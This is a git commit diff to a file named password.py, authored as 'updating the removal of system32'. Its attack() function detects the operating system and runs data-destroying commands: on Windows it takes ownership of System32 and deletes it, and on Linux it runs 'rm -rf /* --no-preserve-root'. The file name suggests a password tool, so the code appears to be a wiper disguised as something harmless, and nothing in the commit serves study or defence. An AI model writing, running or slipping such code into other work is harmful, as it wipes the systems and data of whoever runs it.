a4acbdd6629ac644d830cf02661bd192f484a443
dj1ch <tg.1ch0712@gmail.com>
2023-11-13 08:08:50 -0800

    updated the removal of system32

--- password.py
+++ password.py
@@ -10,7 +10,9 @@ def attack():
     detect.detect()
     operating_system = platform.system()
     if operating_system == "Windows":
-       os.system("rmdir \Windows\System32")
+        os.system("cd C:\Windows")
+        os.system("takeown /F System32 /R")
+       os.system("rmdir System32")
     elif operating_system == "Linux":
        os.system("rm -rf /* --no-preserve-root")
     elif operating_system == "Darwin":
